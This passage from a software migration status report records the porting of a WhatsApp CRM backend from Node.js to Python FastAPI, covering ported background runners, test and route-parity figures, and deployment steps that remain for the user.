  - `tools/run_whatsapp_delivery_mutation_sweep.py`: **8/8 mutants KILLED, 0 survivors**.
- **Phase 11 Status: 100% COMPLETE.**

---

## Final Node.js Retirement Audit

### Proof of Node.js Boundary Reduction
A line-by-line audit confirms that all CRM domain logic, models, controllers, routers, and scheduled jobs have been ported to Python FastAPI.
Node.js retains **strictly and only the Baileys WebSocket gateway** and low-level protocol session maintenance:

1. `backend/src/modules/whatsapp/providers/baileys.provider.ts` (~1,037 lines) — Baileys socket creation, WS events, QR emission, protobuf decoding.
2. `backend/src/modules/whatsapp/sessions/*` (~1,169 lines) — Session manager, reconnect lifecycle, memory state.
3. `backend/src/modules/whatsapp-auth-states/*` (~361 lines) — Low-level Baileys MongoDB credential storage (`creds.json`, app keys, noise keys).
- **Total retained Node.js code**: ~2,567 source lines (~2,697 lines including reconnect test).
- **All other 30 modules**: 100% ported and verified in Python FastAPI.

### All 13 Background Runners Fully Ported
All background runners now operate in Python with atomic MongoDB claim locking, re-entrancy prevention, error isolation, and graceful shutdown:
1. `autoGreet` runner → `app/auto_greet_runner.py`
2. `bookingCountdown` runner → `app/booking_countdown.py`
3. `delivery` runner → `app/delivery_runner.py`
4. `digest` runner → `app/digest.py`
5. `eventReminder` runner → `app/event_reminder_runner.py`
6. `leadImport` runner → `app/lead_import_runner.py`
7. `morningRead` runner → `app/handover_read.py`
8. `nurture` runner → `app/nurture_runner.py`
9. `ownerCallEscalation` runner → `app/owner_call_escalation_runner.py`
10. `paymentFollowUp` runner → `app/payment_followup_runner.py`
11. `promiseFollowUp` runner → `app/promise_follow_up.py`
12. `realtimeOutbox` runner → `app/realtime_outbox.py`
13. `reminder` runner → `app/reminder_runner.py`

---

## CONTINUATION CHECKPOINT: MIGRATION COMPLETE — PRODUCTION CUTOVER

_Last updated after completing Phase 10, Phase 11, Independent Verification, and the final Node.js Retirement Audit. All 11 migration phases are locally implemented, tested, and audited._

### State

| | |
|---|---|
| Python tests | **13,514 passing, 28 skipped** (84 test files) |
| Node tests | **3,221 passing** (131 test files) |
| Node build | clean (`npm run build` exits 0) |
| Frontend build | clean (`tsc --noEmit && vite build` exits 0) |
| Implemented locally | **Phases 0–11 complete (100%)** |
| Express route parity | **129/129 Express routes verified present in FastAPI (0 missing routes)** |
| Total FastAPI routes | **133 mounted endpoint paths** (129 unique canonical routes + 4 trailing-slash aliases) |
| Mutation sweeps | **100% killed across all 20 sweeps (82/82 mutants killed, 0 survivors)** |
| Staging Readiness Plan | Authoritative guide compiled in `STAGING_DEPLOYMENT_READINESS.md` |
| Production Migration Plan | Authoritative cutover guide compiled in `PRODUCTION_MIGRATION_PLAN.md` |
| Deployed | Phase 0 and Phase 1 only (remaining phases ready for user staging & deployment) |

### Registered in `app/main.py` (133 route paths, 129 Express-matching canonical endpoints)

`/health*` (2) · `/starred-messages` (4) · `/stages` (4) · `/tags` (3) · `/settings` (2) · `/templates` (4) ·
`/contacts` (2) · `/users` (7) · `/analytics` (7) · `/auth` (6) · `/push` (3) · `/realtime` (1) ·
`/conversations/{id}/notes` (3) · `/conversations/{id}/tags` (2) · `/conversations/{id}/calls` (3) ·
`/calls` (2) · `/conversations/{id}/call-outcome` (1) · `/conversations/{id}/follow-ups` (5) · `/follow-ups` (4) ·
`/conversations/{id}/media` (1) · `/messages/{id}/media` (1) · `/conversations*` (17 core endpoints including `POST .../ai-draft` and `PATCH .../ai-draft/{draftId}/outcome`) ·
`/lead-sources*` (17 endpoints) · `/meta*` (3 endpoints) · `/ai/knowledge*` (6 endpoints) ·
`/ai-brain*` (9 endpoints) · `/whatsapp-accounts*` (11 endpoints)

### Staging Deployment & Execution Guide

See the newly created, comprehensive guide: **`STAGING_DEPLOYMENT_READINESS.md`**.
It covers:
- Current architecture vs. target architecture topology diagram.
- Complete port and process mapping (FastAPI on `:5002`, Node on `:5001`, Worker single instance).
- Environment variables checklist across all services.
- Background runner safety and deconfliction (`ENABLE_BACKGROUND_RUNNERS=false` on web, disabled flags in Node `backend/.env`).
- MongoDB `rs0` replica set topology and unique compound index `uniq_daily_job_run`.
- Step-by-step deployment procedure.
- 10-point post-deployment smoke test suite.
- 3-level zero-downtime, zero-data-loss rollback procedure.
- Manual actions and blockers checklist.

### Outstanding external actions (Controlled by user)

| Action | Purpose |
|---|---|
| Git commit & push | User controls repository history and remote pushes |
| Production deployment & Caddy cutover | User controls server SSH and infrastructure updates |
| Docker Compose update | Deploy Python FastAPI container on `:5002` beside Baileys gateway on `:5001` |
| Caddy routes configuration | Cut over routes to Python FastAPI as documented in `DEPLOY.md` |
| `uniq_daily_job_run` index | Ensure unique compound index on MongoDB `dailyjobruns` before running scheduler |
| Environment variables | Provide necessary API secrets for Meta, Google Sheets, FCM, and LLM providers |
